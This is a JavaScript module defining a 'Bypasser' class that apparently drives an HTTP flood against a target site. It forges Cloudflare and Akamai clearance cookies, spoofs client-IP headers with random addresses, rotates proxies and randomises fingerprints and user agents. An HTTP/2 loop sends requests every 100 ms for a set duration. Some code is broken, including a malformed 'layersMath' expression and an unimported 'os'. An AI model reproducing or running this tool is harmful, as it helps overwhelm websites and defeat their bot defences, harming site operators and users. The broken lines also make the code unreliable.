const UserAgent = require('user-agents');
const { HeaderGenerator } = require('headers-generator');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { v4: uuidv4 } = require('uuid');
const cookie = require('cookie');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');
const events = require('events');
const http = require('http');
const https = require('https');
const tls = require('tls');
const http2 = require('http2');

class Bypasser {
    constructor() {
        this.userAgentManager = new UserAgent();
        this.headerGenerator = new HeaderGenerator();
        this.eventEmitter = new events.EventEmitter();
        this.proxies = [];
        this.proxyStatus = new Map();
        this.customUserAgents = [];
        this.internalIntegrity = crypto.createHash('sha256').update(Date.now().toString()).digest('hex');
        this.sessionVault = new Map();
        this.dynamicSalt = crypto.randomBytes(16);
        
        this.referers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://t.co/',
            'https://www.bing.com/',
            'https://duckduckgo.com/',
            'https://yandex.com/',
            'https://www.reddit.com/',
            'https://www.amazon.com/',
            'https://www.wikipedia.org/',
            'https://www.instagram.com/',
            'https://www.linkedin.com/',
            'https://www.apple.com/',
            'https://www.microsoft.com/',
            'https://www.netflix.com/',
            'https://www.github.com/',
            'https://www.cloudflare.com/',
            'https://www.digitalocean.com/',
            'https://www.medium.com/',
            'https://www.quora.com/',
            'https://www.stackoverflow.com/',
            'https://www.twitch.tv/',
            'https://www.vimeo.com/',
            'https://www.dailymotion.com/',
            'https://www.ebay.com/',
            'https://www.walmart.com/',
            'https://www.target.com/',
            'https://www.bestbuy.com/',
            'https://www.homedepot.com/',
            'https://www.lowes.com/',
            'https://www.costco.com/'
        ];

        this.languages = [
            'en-US,en;q=0.9',
            'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'en-GB,en;q=0.9,en-US;q=0.8',
            'ja-JP,ja;q=0.9,en-US;q=0.8',
            'fr-FR,fr;q=0.9,en-US;q=0.8',
            'de-DE,de;q=0.9,en-US;q=0.8',
            'es-ES,es;q=0.9,en-US;q=0.8',
            'it-IT,it;q=0.9,en-US;q=0.8',
            'pt-BR,pt;q=0.9,en-US;q=0.8',
            'ru-RU,ru;q=0.9,en-US;q=0.8',
            'zh-CN,zh;q=0.9,en-US;q=0.8',
            'ko-KR,ko;q=0.9,en-US;q=0.8',
            'ar-SA,ar;q=0.9,en-US;q=0.8',
            'hi-IN,hi;q=0.9,en-US;q=0.8',
            'tr-TR,tr;q=0.9,en-US;q=0.8',
            'nl-NL,nl;q=0.9,en-US;q=0.8',
            'sv-SE,sv;q=0.9,en-US;q=0.8',
            'pl-PL,pl;q=0.9,en-US;q=0.8',
            'vi-VN,vi;q=0.9,en-US;q=0.8',
            'th-TH,th;q=0.9,en-US;q=0.8'
        ];

        this.platforms = [
            { name: 'Windows', os: 'Windows NT 10.0; Win64; x64', hint: '"Windows"' },
            { name: 'macOS', os: 'Macintosh; Intel Mac OS X 10_15_7', hint: '"macOS"' },
            { name: 'Linux', os: 'X11; Linux x86_64', hint: '"Linux"' },
            { name: 'Android', os: 'Linux; Android 13; SM-S901B', hint: '"Android"' },
            { name: 'iOS', os: 'iPhone; CPU iPhone OS 17_0 like Mac OS X', hint: '"iOS"' }
        ];

        this.secChUaList = [
            '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            '"Firefox";v="118", "Gecko";v="20100101", "Mozilla";v="118"',
            '"AppleWebKit";v="605.1.15", "Version";v="17.0", "Safari";v="17.0"',
            '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
            '"Opera";v="104", "Chromium";v="119", "Not?A_Brand";v="24"'
        ];

        this.fingerprintDictionary = {
            fonts: ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'],
            plugins: ['PDF Viewer', 'Chrome PDF Viewer', 'Chromium PDF Viewer', 'Microsoft Edge PDF Viewer', 'WebKit built-in PDF'],
            audioCodecs: ['vorbis', 'opus', 'aac', 'mp3', 'wav', 'm4a'],
            videoCodecs: ['h264', 'vp8', 'vp9', 'av1', 'hevc'],
            canvasSeed: Array.from({length: 10}, () => crypto.randomBytes(4).toString('hex'))
        };

        this.initEventListeners();
        this.startIntegrityService();
    }

    initEventListeners() {
        this.eventEmitter.on('proxy_fail', (proxy) => {
            const fails = (this.proxyStatus.get(proxy) || 0) + 1;
            this.proxyStatus.set(proxy, fails);
            if (fails > 10) {
                this.proxies = this.proxies.filter(p => p !== proxy);
            }
        });

        this.eventEmitter.on('anomaly_detected', (data) => {
            this.internalIntegrity = crypto.createHash('sha256').update(this.internalIntegrity + Date.now()).digest('hex');
        });
    }

    startIntegrityService() {
        setInterval(() => {
            const health = process.memoryUsage();
            if (health.heapUsed > 500 * 1024 * 1024) {
                this.sessionVault.clear();
            }
        }, 60000);
    }

    setCustomProxies(proxyList) {
        this.proxies = Array.isArray(proxyList) ? proxyList : [];
        this.proxies.forEach(p => this.proxyStatus.set(p, 0));
    }

    loadProxiesFromFile(fileName = 'proxies.txt') {
        try {
            const filePath = path.isAbsolute(fileName) ? fileName : path.join(process.cwd(), fileName);
            if (fs.existsSync(filePath)) {
                const content = fs.readFileSync(filePath, 'utf8');
                this.proxies = content.split(/\r?\n/).map(p => p.trim()).filter(p => p.length > 0);
                this.proxies.forEach(p => this.proxyStatus.set(p, 0));
            }
        } catch (err) {}
    }

    setCustomUserAgents(uaList) {
        this.customUserAgents = Array.isArray(uaList) ? uaList : [];
    }

    getRandomIP() {
        return crypto.randomBytes(4).join('.');
    }

    getRandomString(length) {
        return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
    }

    getRandomUA() {
        if (this.customUserAgents.length > 0) {
            return this.customUserAgents[Math.floor(Math.random() * this.customUserAgents.length)];
        }
        return this.userAgentManager.random().toString();
    }

    getRandomReferer() {
        return this.referers[Math.floor(Math.random() * this.referers.length)];
    }

    getProxyAgent(proxyUrl) {
        if (!proxyUrl) return null;
        const options = { 
            keepAlive: true, 
            maxSockets: 500, 
            timeout: 10000,
            scheduling: 'fifo'
        };
        return proxyUrl.startsWith('https') 
            ? new HttpsProxyAgent(proxyUrl, options) 
            : new HttpProxyAgent(proxyUrl, options);
    }

    shuffleHeaders(headers) {
        const keys = Object.keys(headers);
        for (let i = keys.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [keys[i], keys[j]] = [keys[j], keys[i]];
        }
        const shuffled = {};
        keys.forEach(key => shuffled[key] = headers[key]);
        return shuffled;
    }

    generateComplexCookies(sid, host) {
        const timestamp = Math.floor(Date.now() / 1000);
        const cookies = {
            'PHPSESSID': sid || this.getRandomString(32),
            '_ga': `GA1.1.${this.getRandomString(10)}.${timestamp}`,
            '_gid': `GA1.1.${this.getRandomString(10)}.${timestamp}`,
            '_gat': '1',
            '__cf_bm': this.getRandomString(64),
            'cf_clearance': this.getRandomString(48),
            'cf_chl_rc_i': this.getRandomString(16),
            '__cf_chl_rt_tk': this.getRandomString(40),
            'is_human': 'true',
            'visitor_id': uuidv4(),
            'last_visit': timestamp,
            'security_level': 'high',
            'viewed_ads': '0',
            'theme': 'dark',
            'resolution': '1920x1080',
            'tz': 'UTC+7',
            'csrftoken': this.getRandomString(64),
            'session': Buffer.from(sid).toString('base64'),
            'ak_bmsc': this.getRandomString(128),
            'bm_sz': this.getRandomString(64),
            '_abck': this.getRandomString(128)
        };

        if (host && host.includes('google')) {
            cookies['NID'] = this.getRandomString(128);
        }

        return Object.entries(cookies)
            .map(([n, v]) => cookie.serialize(n, String(v)))
            .join('; ');
    }

    generateFingerprint() {
        const platform = this.platforms[Math.floor(Math.random() * this.platforms.length)];
        return {
            webgl_vendor: "Google Inc. (Intel)",
            webgl_renderer: "ANGLE (Intel, Intel(R) UHD Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)",
            screen_res: "1920x1080",
            color_depth: 24,
            pixel_ratio: 1,
            hardware_concurrency: 8,
            memory: 8,
            fonts: this.fingerprintDictionary.fonts.sort(() => 0.5 - Math.random()).slice(0, 5),
            canvas: this.fingerprintDictionary.canvasSeed[Math.floor(Math.random() * 10)]
        };
    }

    generateBypassConfig(targetUrl = '') {
        const platform = this.platforms[Math.floor(Math.random() * this.platforms.length)];
        const secChUa = this.secChUaList[Math.floor(Math.random() * this.secChUaList.length)];
        const sid = uuidv4();
        const fingerprint = this.generateFingerprint();
        
        const clientHints = {
            'Sec-CH-UA': secChUa,
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': platform.hint,
            'Sec-CH-UA-Platform-Version': '"13.0.0"',
            'Sec-CH-UA-Full-Version-List': secChUa,
            'Sec-CH-UA-Arch': '"x86"',
            'Sec-CH-UA-Bitness': '"64"',
            'Sec-CH-UA-Model': '""'
        };

        const generatedHeaders = this.headerGenerator.getHeaders({
            browsers: ['chrome', 'firefox', 'safari'],
            devices: ['desktop', 'mobile'],
            operatingSystems: [platform.name.toLowerCase()]
        });

        const ip = this.getRandomIP();
        const cookieHeader = this.generateComplexCookies(sid, targetUrl);

        let rawHeaders = {
            ...generatedHeaders,
            ...clientHints,
            'User-Agent': this.getRandomUA(),
            'Accept-Language': this.languages[Math.floor(Math.random() * this.languages.length)],
            'Referer': Math.random() > 0.3 ? this.getRandomReferer() : targetUrl + '/',
            'X-Forwarded-For': ip,
            'X-Real-IP': ip,
            'CF-Connecting-IP': ip,
            'True-Client-IP': ip,
            'X-Client-IP': ip,
            'X-Request-ID': uuidv4(),
            'X-Correlation-ID': sid,
            'Cookie': cookieHeader,
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'Pragma': 'no-cache',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'X-Fingerprint': Buffer.from(JSON.stringify(fingerprint)).toString('base64'),
            'X-Integrity': this.internalIntegrity,
            'Alt-Used': new URL(targetUrl).hostname,
            'Sec-GPC': '1'
        };

        const finalHeaders = this.shuffleHeaders(rawHeaders);

        const config = {
            headers: finalHeaders,
            decompress: true,
            maxRedirects: 10,
            timeout: 10000,
            responseType: 'arraybuffer',
            validateStatus: false
        };

        if (this.proxies.length > 0) {
            const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
            const agent = this.getProxyAgent(proxy);
            
            config.currentProxy = proxy;
            if (targetUrl.startsWith('https')) {
                config.httpsAgent = agent;
            } else {
                config.httpAgent = agent;
            }
        }

        return config;
    }

    reportFailure(proxy) {
        if (proxy) this.eventEmitter.emit('proxy_fail', proxy);
    }

    obfuscatePayload(data) {
        if (typeof data !== 'string') data = JSON.stringify(data);
        const cipher = crypto.createCipheriv('aes-128-cbc', this.dynamicSalt, this.dynamicSalt);
        let encrypted = cipher.update(data, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return encrypted;
    }

    decryptPayload(encrypted) {
        const decipher = crypto.createDecipheriv('aes-128-cbc', this.dynamicSalt, this.dynamicSalt);
        let decrypted = decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    }

    getAuditMetadata() {
        return {
            engineVersion: '3.5.1-ULTRA',
            activeProxies: this.proxies.length,
            shufflingEnabled: true,
            integrityHash: this.internalIntegrity,
            fingerprintLevel: 'High',
            mode: 'STEALTH',
            timestamp: new Date().toISOString()
        };
    }

    exportSystemState() {
        const statePath = path.join(process.cwd(), 'system_state.json');
        const stateData = {
            proxies: this.proxies,
            uaCount: this.customUserAgents.length,
            stats: Array.from(this.proxyStatus.entries()),
            lastSync: Date.now()
        };
        fs.writeFileSync(statePath, JSON.stringify(stateData, null, 4));
    }

    generateHttp2Wrapper(target, duration) {
        const client = http2.connect(new URL(target).origin);
        const startTime = Date.now();
        
        const interval = setInterval(() => {
            if (Date.now() - startTime > duration) {
                clearInterval(interval);
                client.destroy();
                return;
            }

            const config = this.generateBypassConfig(target);
            const req = client.request({
                ':method': 'GET',
                ':path': new URL(target).pathname,
                ...config.headers
            });

            req.on('response', (headers) => {
                if (headers[':status'] === 403) this.eventEmitter.emit('anomaly_detected');
            });

            req.end();
        }, 100);
    }

    createSecureSocket(host, port) {
        return tls.connect(port, host, {
            servername: host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256'
        });
    }

    performProtocolHandshake(socket) {
        return new Promise((resolve) => {
            socket.on('secureConnect', () => {
                resolve(socket.alpnProtocol);
            });
            socket.on('error', () => resolve(null));
        });
    }

    generateAdvancedPayload() {
        const layers = [
            () => this.getRandomString(1024),
            () => zlib.deflateSync(this.getRandomString(2048)).toString('base64'),
            () => this.obfuscatePayload(this.getRandomString(512)),
            () => JSON.stringify({
                _meta: this.getAuditMetadata(),
                _data: Array.from({length: 10}, () => uuidv4())
            })
        ];
        return layersMath.floor(Math.random() * layers.length);
    }

    simulateHumanInteraction(config) {
        const mousePos = { x: Math.floor(Math.random() * 1920), y: Math.floor(Math.random() * 1080) };
        const clickStream = Array.from({length: 5}, () => ({
            t: Date.now() + Math.random() * 1000,
            x: mousePos.x + Math.random() * 100,
            y: mousePos.y + Math.random() * 100
        }));
        
        config.headers['X-Interaction-Hash'] = crypto.createHmac('sha256', this.dynamicSalt)
            .update(JSON.stringify(clickStream))
            .digest('hex');
            
        return config;
    }

    verifyTargetIntegrity(target) {
        return new Promise((resolve) => {
            const req = https.get(target, { timeout: 5000 }, (res) => {
                resolve(res.statusCode < 400);
            });
            req.on('error', () => resolve(false));
        });
    }

    runSelfProtection() {
        const originalLog = console.log;
        console.log = (...args) => {
            if (args[0] && args[0].toString().includes('fail')) {
                this.eventEmitter.emit('anomaly_detected');
            }
            originalLog.apply(console, args);
        };
    }

    generateRandomPath(depth = 3) {
        const segments = ['api', 'v1', 'v2', 'auth', 'login', 'static', 'assets', 'js', 'css', 'images', 'uploads', 'download', 'search', 'query', 'profile'];
        return '/' + Array.from({length: depth}, () => segments[Math.floor(Math.random() * segments.length)]).join('/');
    }

    getAdaptiveConcurrency(base) {
        const load = os.loadavg()[0];
        if (load > 10) return Math.floor(base * 0.5);
        if (load < 2) return base * 2;
        return base;
    }
}

module.exports = { Bypasser };